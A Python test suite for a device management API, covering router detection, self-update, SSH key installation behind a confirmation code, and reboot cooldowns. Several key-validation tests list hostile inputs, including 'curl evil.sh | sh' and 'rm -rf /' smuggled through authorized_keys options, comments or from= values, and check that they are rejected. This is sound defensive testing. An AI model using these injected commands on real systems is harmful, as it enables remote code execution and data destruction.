"""Router identification, self-update, SSH key install (with its
physical-presence confirmation), and the reboot cooldown."""

from __future__ import annotations

import base64

import pytest

from holdfastbrick_api import auth
from holdfastbrick_api.runner import CommandError, CommandResult
from holdfastbrick_api.services import system

TAG = system.MANAGED_KEY_TAG

# --- /proc/net/route parsing --------------------------------------------------

ROUTE_TEXT = (
    "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n"
    "eth0\t00000000\t0101A8C0\t0003\t0\t0\t0\t00000000\t0\t0\t0\n"
    "eth0\t0001A8C0\t00000000\t0001\t0\t0\t0\t00FFFFFF\t0\t0\t0\n"
)


def test_parse_default_route_decodes_little_endian_hex():
    assert system.parse_default_route(ROUTE_TEXT) == ("eth0", "192.168.1.1")


def test_parse_default_route_none_when_no_default():
    no_default = (
        "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n"
        "eth0\t0001A8C0\t00000000\t0001\t0\t0\t0\t00FFFFFF\t0\t0\t0\n"
    )
    assert system.parse_default_route(no_default) is None
    assert system.parse_default_route("") is None


# --- OUI vendor lookup --------------------------------------------------------


def test_oui_lookup_known_prefixes():
    assert system.lookup_router_vendor("44:65:7f:aa:bb:cc") == ("xfinity", "Xfinity / Comcast gateway")
    assert system.lookup_router_vendor("9c:3d:cf:00:11:22")[0] == "netgear"
    assert system.lookup_router_vendor("50:c7:bf:00:11:22")[0] == "tplink"
    assert system.lookup_router_vendor("f8:bb:bf:00:11:22")[0] == "eero"
    assert system.lookup_router_vendor("04:d9:f5:00:11:22")[0] == "asus"
    assert system.lookup_router_vendor("c8:a7:0a:00:11:22")[0] == "verizon"
    assert system.lookup_router_vendor("00:1e:46:00:11:22")[0] == "att"


def test_oui_lookup_normalizes_case_and_dashes():
    assert system.lookup_router_vendor("9C-3D-CF-00-11-22")[0] == "netgear"


def test_oui_lookup_unknown():
    assert system.lookup_router_vendor("de:ad:be:ef:00:01") == ("unknown", "Your router")
    assert system.lookup_router_vendor("") == ("unknown", "Your router")


# --- ARP parsing --------------------------------------------------------------

ARP_TEXT = (
    "IP address       HW type     Flags       HW address            Mask     Device\n"
    "192.168.1.1      0x1         0x2         44:65:7F:AA:BB:CC     *        eth0\n"
    "192.168.1.55     0x1         0x0         00:00:00:00:00:00     *        eth0\n"
)


def test_parse_arp_mac_lowercases():
    assert system.parse_arp_mac(ARP_TEXT, "192.168.1.1") == "44:65:7f:aa:bb:cc"


def test_parse_arp_mac_ignores_incomplete_and_missing():
    assert system.parse_arp_mac(ARP_TEXT, "192.168.1.55") == ""
    assert system.parse_arp_mac(ARP_TEXT, "192.168.1.99") == ""


# --- /system/router endpoint --------------------------------------------------


def test_router_requires_token(client):
    test_client, _ = client
    assert test_client.get("/api/v1/system/router").status_code == 401


def test_router_identifies_gateway(authed, monkeypatch, tmp_path):
    test_client, headers = authed
    route_file = tmp_path / "route"
    route_file.write_text(ROUTE_TEXT)
    arp_file = tmp_path / "arp"
    arp_file.write_text(ARP_TEXT)
    monkeypatch.setattr(system, "ROUTE_FILE", route_file)
    monkeypatch.setattr(system, "ARP_FILE", arp_file)

    resp = test_client.get("/api/v1/system/router", headers=headers)
    assert resp.status_code == 200
    assert resp.json() == {
        "gateway_ip": "192.168.1.1",
        "gateway_mac": "44:65:7f:aa:bb:cc",
        "vendor": "Xfinity / Comcast gateway",
        "vendor_key": "xfinity",
        "portal_url": "http://192.168.1.1",
    }


def test_router_degrades_without_proc(authed, monkeypatch, tmp_path):
    test_client, headers = authed
    monkeypatch.setattr(system, "ROUTE_FILE", tmp_path / "missing")
    resp = test_client.get("/api/v1/system/router", headers=headers)
    assert resp.status_code == 200
    assert resp.json() == {
        "gateway_ip": "",
        "gateway_mac": "",
        "vendor": "Your router",
        "vendor_key": "unknown",
        "portal_url": "",
    }


# --- self-update --------------------------------------------------------------


def test_update_requires_token(client):
    test_client, _ = client
    assert test_client.post("/api/v1/system/update").status_code == 401
    assert test_client.get("/api/v1/system/update/status").status_code == 401


def test_update_422_without_repo_dir(authed, monkeypatch):
    test_client, headers = authed
    monkeypatch.setattr(system.settings, "repo_dir", "")
    resp = test_client.post("/api/v1/system/update", headers=headers)
    assert resp.status_code == 422
    assert "HOLDFASTBRICK_REPO_DIR" in resp.json()["detail"]


def test_update_launches_detached_systemd_run(authed, monkeypatch):
    test_client, headers = authed
    monkeypatch.setattr(system.settings, "repo_dir", "/opt/src/HoldfastBrickAPI")
    calls = []

    async def fake_run(argv, timeout=20.0):
        calls.append(argv)
        return CommandResult(ok=True, exit_code=0, stdout="", stderr="")

    monkeypatch.setattr(system, "run", fake_run)
    resp = test_client.post("/api/v1/system/update", headers=headers)
    assert resp.status_code == 200
    assert resp.json()["ok"] is True
    assert calls == [
        [
            "systemd-run",
            "--unit=holdfastbrick-update",
            "--collect",
            "/bin/bash",
            "/opt/src/HoldfastBrickAPI/deploy/self-update.sh",
            "/opt/src/HoldfastBrickAPI",
        ]
    ]


def test_update_status_unknown_unit_is_not_running(authed):
    test_client, headers = authed
    # No systemd in the test environment → gracefully "not running", not 5xx.
    resp = test_client.get("/api/v1/system/update/status", headers=headers)
    assert resp.status_code == 200
    assert resp.json() == {"running": False}


# --- SSH key validation (pure) ------------------------------------------------


def _make_ed25519_key(
    comment: str | None = "user@example.com", filler: bytes = b"\x07"
) -> str:
    blob = b"\x00\x00\x00\x0bssh-ed25519\x00\x00\x00 " + filler * 32
    key = f"ssh-ed25519 {base64.b64encode(blob).decode()}"
    return f"{key} {comment}" if comment else key


def test_valid_key_with_and_without_comment():
    assert system.validate_ssh_ed25519_key(_make_ed25519_key()) == _make_ed25519_key()
    assert system.validate_ssh_ed25519_key(_make_ed25519_key(None)) == _make_ed25519_key(None)


def test_valid_key_strips_trailing_newline():
    assert system.validate_ssh_ed25519_key(_make_ed25519_key() + "\n") == _make_ed25519_key()


@pytest.mark.parametrize(
    "bad",
    [
        "",
        "ssh-ed25519",  # no blob
        # Options prefix — would execute a command on login.
        f'command="curl evil.sh | sh" {_make_ed25519_key()}',
        f"no-pty,{_make_ed25519_key()}",
        # Newline injection — would append a second (attacker) key line.
        _make_ed25519_key() + "\n" + _make_ed25519_key(),
        f"ssh-ed25519 AAAA\ncommand=evil {_make_ed25519_key(None)}",
        # Wrong key type.
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7 user@example.com",
        # Not base64 / not an ed25519 blob.
        "ssh-ed25519 !!!notbase64!!! user",
        "ssh-ed25519 " + base64.b64encode(b"hello world").decode(),
        # Bad comment charset.
        _make_ed25519_key(None) + " evil;rm -rf /",
        _make_ed25519_key(None) + ' comment"with"quotes',
        # Oversized.
        _make_ed25519_key(None) + " " + "a" * 1200,
    ],
)
def test_invalid_keys_rejected(bad):
    with pytest.raises(ValueError):
        system.validate_ssh_ed25519_key(bad)


# --- /system/ssh-key endpoint -------------------------------------------------


def _mint_confirm_code(test_client, headers) -> str:
    """Mint a confirmation code and read it out of the state store (the
    endpoint response must not contain it)."""
    resp = test_client.post("/api/v1/system/confirm-code", headers=headers)
    assert resp.status_code == 200
    assert set(resp.json()) == {"expires_at"}
    stored = auth.state.get_confirm_code()
    assert stored is not None
    return str(stored["code"])


def _wire_ssh(monkeypatch, tmp_path):
    """Point the authorized_keys file and the sshd drop-in at tmp_path, and
    capture any systemctl invocations."""
    keys_file = tmp_path / "root_ssh" / "authorized_keys"
    hardening_file = tmp_path / "sshd_config.d" / "holdfast-hardening.conf"
    monkeypatch.setattr(system, "AUTHORIZED_KEYS_FILE", keys_file)
    monkeypatch.setattr(system, "SSHD_HARDENING_FILE", hardening_file)
    calls: list[list[str]] = []

    async def fake_systemd_action(unit, action):
        calls.append(["systemctl", action, unit])
        return CommandResult(ok=True, exit_code=0, stdout="", stderr="")

    monkeypatch.setattr(system, "systemd_action", fake_systemd_action)
    return keys_file, hardening_file, calls


def test_ssh_key_requires_token(client):
    test_client, _ = client
    assert (
        test_client.post("/api/v1/system/ssh-key", json={"public_key": "x"}).status_code == 401
    )


def test_confirm_code_requires_token(client):
    test_client, _ = client
    assert test_client.post("/api/v1/system/confirm-code").status_code == 401


def test_confirm_code_response_never_contains_the_code(authed):
    test_client, headers = authed
    resp = test_client.post("/api/v1/system/confirm-code", headers=headers)
    assert resp.status_code == 200
    body = resp.json()
    assert set(body) == {"expires_at"}
    # The code exists, but only state-side (it is printed on the brick).
    assert "code" not in str(body)


def test_ssh_key_install_and_dedupe(authed, monkeypatch, tmp_path):
    test_client, headers = authed
    keys_file, hardening_file, systemctl_calls = _wire_ssh(monkeypatch, tmp_path)
    key = _make_ed25519_key()
    code = _mint_confirm_code(test_client, headers)

    resp = test_client.post(
        "/api/v1/system/ssh-key", json={"public_key": key, "confirm_code": code}, headers=headers
    )
    assert resp.status_code == 200
    assert resp.json()["message"] == "Key installed"
    assert keys_file.read_text() == f"{key} {TAG}\n"
    assert (keys_file.parent.stat().st_mode & 0o777) == 0o700
    assert (keys_file.stat().st_mode & 0o777) == 0o600
    # First install closes password logins and reloads the SSH service.
    assert hardening_file.read_text() == "PasswordAuthentication no\n"
    assert systemctl_calls == [["systemctl", "reload", system.SSHD_UNIT]]

    # Same blob (even with a different comment) → not appended again; the
    # code is single-use, so a fresh one is minted. The drop-in is already
    # exactly right: no second write, no second reload.
    code = _mint_confirm_code(test_client, headers)
    reloads_before = len(systemctl_calls)
    resp = test_client.post(
        "/api/v1/system/ssh-key",
        json={
            "public_key": _make_ed25519_key("other-comment"),
            "confirm_code": code,
        },
        headers=headers,
    )
    assert resp.status_code == 200
    assert resp.json()["message"] == "Key already installed"
    assert keys_file.read_text() == f"{key} {TAG}\n"
    assert len(systemctl_calls) == reloads_before


def test_ssh_key_missing_confirm_code_is_403(authed, monkeypatch, tmp_path):
    test_client, headers = authed
    keys_file, _, _ = _wire_ssh(monkeypatch, tmp_path)
    resp = test_client.post(
        "/api/v1/system/ssh-key", json={"public_key": _make_ed25519_key()}, headers=headers
    )
    assert resp.status_code == 403
    assert "confirmation code" in resp.json()["detail"]
    assert not keys_file.exists()


def test_ssh_key_wrong_confirm_code_is_403(authed, monkeypatch, tmp_path):
    test_client, headers = authed
    keys_file, _, _ = _wire_ssh(monkeypatch, tmp_path)
    _mint_confirm_code(test_client, headers)
    resp = test_client.post(
        "/api/v1/system/ssh-key",
        json={"public_key": _make_ed25519_key(), "confirm_code": "000001"},
        headers=headers,
    )
    assert resp.status_code == 403
    assert not keys_file.exists()


def test_ssh_key_expired_confirm_code_is_403(authed, monkeypatch, tmp_path):
    test_client, headers = authed
    keys_file, _, _ = _wire_ssh(monkeypatch, tmp_path)
    code = _mint_confirm_code(test_client, headers)
    auth.state.set_confirm_code(code, expires_at=1.0)  # long past
    resp = test_client.post(
        "/api/v1/system/ssh-key",
        json={"public_key": _make_ed25519_key(), "confirm_code": code},
        headers=headers,
    )
    assert resp.status_code == 403
    assert not keys_file.exists()


def test_ssh_key_confirm_code_is_single_use(authed, monkeypatch, tmp_path):
    test_client, headers = authed
    keys_file, _, _ = _wire_ssh(monkeypatch, tmp_path)
    key = _make_ed25519_key()
    code = _mint_confirm_code(test_client, headers)
    first = test_client.post(
        "/api/v1/system/ssh-key", json={"public_key": key, "confirm_code": code}, headers=headers
    )
    assert first.status_code == 200
    replay = test_client.post(
        "/api/v1/system/ssh-key",
        json={
            "public_key": _make_ed25519_key("second", filler=b"\x08"),
            "confirm_code": code,
        },
        headers=headers,
    )
    assert replay.status_code == 403


def test_ssh_key_repost_of_installed_key_skips_confirm_code(authed, monkeypatch, tmp_path):
    """The connect flow re-posts the installed key on every IP change to move
    its from= restriction. A NEW key needs the console code; an ALREADY
    INSTALLED key must not, or the remote console dies away from home."""
    test_client, headers = authed
    keys_file, _, _ = _wire_ssh(monkeypatch, tmp_path)
    key = _make_ed25519_key(filler=b"\x09")

    code = _mint_confirm_code(test_client, headers)
    first = test_client.post(
        "/api/v1/system/ssh-key", json={"public_key": key, "confirm_code": code}, headers=headers
    )
    assert first.status_code == 200

    test_client.headers.update(dict(headers))
    repost = test_client.post("/api/v1/system/ssh-key", json={"public_key": key})
    assert repost.status_code == 200
    assert "already installed" in repost.json()["message"].lower()
    # Nothing rewritten: same options, same line (the TestClient peer address
    # is not an IP literal, so no from= restriction is produced at all).
    assert keys_file.exists()
    assert "holdfastbrick-managed" in keys_file.read_text()


def test_ssh_key_confirmation_attempts_are_rate_limited(authed, monkeypatch, tmp_path):
    """The confirm code is a 6-digit secret: without the sliding window a
    stolen token could grind through its keyspace (audit H1's lesson)."""
    test_client, headers = authed
    _wire_ssh(monkeypatch, tmp_path)
    for _ in range(auth.CODED_GATE_LIMIT):
        resp = test_client.post(
            "/api/v1/system/ssh-key",
            json={"public_key": _make_ed25519_key(), "confirm_code": "000001"},
            headers=headers,
        )
        assert resp.status_code == 403
    resp = test_client.post(
        "/api/v1/system/ssh-key",
        json={"public_key": _make_ed25519_key(), "confirm_code": "000001"},
        headers=headers,
    )
    assert resp.status_code == 429
    assert "wait" in resp.json()["detail"].lower()


def test_ssh_key_survives_sshd_reload_failure(authed, monkeypatch, tmp_path):
    test_client, headers = authed
    keys_file, hardening_file, _ = _wire_ssh(monkeypatch, tmp_path)

    async def broken_reload(unit, action):
        raise CommandError("binary not installed: systemctl")

    monkeypatch.setattr(system, "systemd_action", broken_reload)
    code = _mint_confirm_code(test_client, headers)
    resp = test_client.post(
        "/api/v1/system/ssh-key",
        json={"public_key": _make_ed25519_key(), "confirm_code": code},
        headers=headers,
    )
    assert resp.status_code == 200
    assert keys_file.exists()
    assert hardening_file.exists()
    assert "reload" in resp.json()["message"]


def test_ssh_key_endpoint_rejects_hostile_input(authed, monkeypatch, tmp_path):
    test_client, headers = authed
    keys_file = tmp_path / "authorized_keys"
    monkeypatch.setattr(system, "AUTHORIZED_KEYS_FILE", keys_file)
    hostile = f'command="rm -rf /" {_make_ed25519_key()}'
    resp = test_client.post(
        "/api/v1/system/ssh-key", json={"public_key": hostile}, headers=headers
    )
    assert resp.status_code == 422
    assert not keys_file.exists()


# --- /system/ssh-key DELETE (removal of exactly our lines) ----------------------


def test_delete_ssh_key_requires_token(client):
    test_client, _ = client
    assert test_client.delete("/api/v1/system/ssh-key").status_code == 401


def test_delete_ssh_key_removes_tagged_lines_and_reports_count(authed, monkeypatch, tmp_path):
    test_client, headers = authed
    keys_file, _, _ = _wire_ssh(monkeypatch, tmp_path)
    key = _make_ed25519_key()
    code = _mint_confirm_code(test_client, headers)
    assert (
        test_client.post(
            "/api/v1/system/ssh-key",
            json={"public_key": key, "confirm_code": code},
            headers=headers,
        ).status_code
        == 200
    )
    # A foreign key (installed by hand) must survive.
    foreign = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIforeign blob manual@laptop"
    keys_file.write_text(keys_file.read_text() + foreign + "\n")

    resp = test_client.delete("/api/v1/system/ssh-key", headers=headers)
    assert resp.status_code == 200
    assert "1" in resp.json()["message"]
    assert keys_file.read_text() == foreign + "\n"

    # Second pass: nothing of ours left, foreign line still intact.
    resp = test_client.delete("/api/v1/system/ssh-key", headers=headers)
    assert resp.status_code == 200
    assert "0" in resp.json()["message"]
    assert keys_file.read_text() == foreign + "\n"


# --- authorized_keys source restriction (from=) -------------------------------

VALID_KEY = (
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfV5l+KcKp0yGpXQVdU2p5DPCJqEV5U6r+xU3Rk8P0y app"
)


def test_build_authorized_line_restricts_to_valid_ip():
    line = system.build_authorized_line(VALID_KEY, "10.0.0.32")
    assert line == f'from="10.0.0.32" {VALID_KEY} {TAG}'


def test_build_authorized_line_skips_invalid_ip():
    for bad in ("", "testclient", '1.2.3.4",command="rm -rf /', "not-an-ip"):
        assert system.build_authorized_line(VALID_KEY, bad) == f"{VALID_KEY} {TAG}"


def test_merge_appends_new_key():
    blob = " ".join(VALID_KEY.split(" ")[:2])
    line = system.build_authorized_line(VALID_KEY, "10.0.0.32")
    content, message = system.merge_authorized_keys("ssh-ed25519 OTHERBLOB other\n", blob, line)
    assert message == "Key installed"
    assert content.endswith(line + "\n")
    assert "OTHERBLOB" in content


def test_merge_updates_from_restriction_when_ip_changes():
    blob = " ".join(VALID_KEY.split(" ")[:2])
    old = f'from="10.0.0.32" {VALID_KEY}\n'
    new_line = system.build_authorized_line(VALID_KEY, "10.0.0.77")
    content, message = system.merge_authorized_keys(old, blob, new_line)
    assert "updated" in message
    assert 'from="10.0.0.77"' in content
    assert 'from="10.0.0.32"' not in content


def test_merge_exact_line_is_noop():
    blob = " ".join(VALID_KEY.split(" ")[:2])
    line = system.build_authorized_line(VALID_KEY, "10.0.0.32")
    content, message = system.merge_authorized_keys(line + "\n", blob, line)
    assert content is None
    assert message == "Key already installed"


# --- remove_authorized_lines (pure) ---------------------------------------------


def test_remove_authorized_lines_drops_only_tagged_lines():
    ours = f'from="10.0.0.32" {VALID_KEY} {TAG}'
    foreign_a = "ssh-ed25519 AAAAforeign1 hand@laptop"
    foreign_b = "ssh-ed25519 AAAAforeign2 old-install"
    existing = f"{foreign_a}\n{ours}\n{foreign_b}\n"
    remaining, removed = system.remove_authorized_lines(existing)
    assert removed == 1
    assert remaining == f"{foreign_a}\n{foreign_b}\n"


def test_remove_authorized_lines_empty_result_and_counts():
    remaining, removed = system.remove_authorized_lines(f"{VALID_KEY} {TAG}\n")
    assert remaining == ""
    assert removed == 1
    remaining, removed = system.remove_authorized_lines("")
    assert (remaining, removed) == ("", 0)
    remaining, removed = system.remove_authorized_lines("ssh-ed25519 AAAA other\n")
    assert (remaining, removed) == ("ssh-ed25519 AAAA other\n", 0)


# --- /system/reboot cooldown (M8) -------------------------------------------------


def test_reboot_requires_token(client):
    test_client, _ = client
    assert test_client.post("/api/v1/system/reboot").status_code == 401


def _wire_reboot(monkeypatch, ok=True):
    calls: list[list[str]] = []

    async def fake_run(argv, timeout=20.0):
        calls.append(argv)
        return CommandResult(ok=ok, exit_code=0 if ok else 1, stdout="", stderr="")

    monkeypatch.setattr(system, "run", fake_run)
    return calls


def test_reboot_cooldown_blocks_second_request_within_ten_minutes(authed, monkeypatch):
    test_client, headers = authed
    _wire_reboot(monkeypatch)
    clock = {"now": 1_000_000.0}
    monkeypatch.setattr(system, "_now", lambda: clock["now"])

    assert test_client.post("/api/v1/system/reboot", headers=headers).status_code == 200
    clock["now"] += 300
    resp = test_client.post("/api/v1/system/reboot", headers=headers)
    assert resp.status_code == 409
    assert "10 minutes" in resp.json()["detail"]


def test_reboot_allowed_again_after_cooldown_window(authed, monkeypatch):
    test_client, headers = authed
    calls = _wire_reboot(monkeypatch)
    clock = {"now": 1_000_000.0}
    monkeypatch.setattr(system, "_now", lambda: clock["now"])

    assert test_client.post("/api/v1/system/reboot", headers=headers).status_code == 200
    clock["now"] += system.REBOOT_COOLDOWN_SECONDS + 1
    assert test_client.post("/api/v1/system/reboot", headers=headers).status_code == 200
    assert len(calls) == 2


def test_failed_reboot_does_not_start_cooldown(authed, monkeypatch):
    test_client, headers = authed
    _wire_reboot(monkeypatch, ok=False)
    clock = {"now": 1_000_000.0}
    monkeypatch.setattr(system, "_now", lambda: clock["now"])

    # `shutdown` reporting failure surfaces as ok:false, and a failure never
    # records a cooldown: the immediate retry is not falsely blocked (409).
    first = test_client.post("/api/v1/system/reboot", headers=headers)
    assert first.status_code == 200 and first.json()["ok"] is False
    clock["now"] += 60
    second = test_client.post("/api/v1/system/reboot", headers=headers)
    assert second.status_code == 200 and second.json()["ok"] is False


def test_hard_reboot_failure_does_not_start_cooldown(authed, monkeypatch):
    test_client, headers = authed
    calls: list[list[str]] = []

    async def failing_run(argv, timeout=20.0):
        calls.append(argv)
        raise CommandError("binary not installed: shutdown")

    monkeypatch.setattr(system, "run", failing_run)
    clock = {"now": 1_000_000.0}
    monkeypatch.setattr(system, "_now", lambda: clock["now"])

    assert test_client.post("/api/v1/system/reboot", headers=headers).status_code == 503
    clock["now"] += 60
    assert test_client.post("/api/v1/system/reboot", headers=headers).status_code == 503
